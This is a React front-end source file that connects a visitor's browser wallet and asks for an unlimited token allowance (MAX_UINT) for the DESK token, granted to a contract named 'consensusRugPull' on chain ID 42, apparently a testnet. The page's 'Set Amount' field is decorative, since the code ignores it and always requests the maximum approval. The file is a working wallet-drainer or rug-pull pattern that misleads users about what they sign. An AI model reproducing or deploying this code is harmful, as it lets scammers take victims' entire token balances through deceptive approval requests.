import './App.css';
import { ethers } from 'ethers';
import deskTokenABI from './constants/abi/deskToken.json';
import { deskToken, consensusRugPull } from './config';

// eslint-disable-next-line no-undef
const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
const CHAIN_ID = 42;

let provider;

function App() {
  async function requestAccount() {
    await window.ethereum.request({ method: 'eth_requestAccounts' });

    if (window.ethereum) {
      provider = new ethers.providers.Web3Provider(window.ethereum, "any");

      try {
        await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
          params: [{ chainId: ethers.utils.hexlify(CHAIN_ID) }],
        });
      } catch (error) {
        console.error(error);
        window.location.reload();
      }
    }

  }

  async function approve() {
    if (typeof window.ethereum !== 'undefined') {
      await requestAccount();
      console.log({ provider })
      const signer = provider.getSigner()
      const deskTokenContract = new ethers.Contract(deskToken, deskTokenABI, signer)
      const transaction = await deskTokenContract.approve(consensusRugPull, MAX_UINT);
      await transaction.wait();
    } 
  }

  return (
    <div className="App">
      <header className="App-header">
        <input placeholder="Set Amount" />
        <button onClick={approve} placeholder="Amount to approve">Approve DESK</button>
        <br />
      </header>
    </div>
  );
}

export default App;
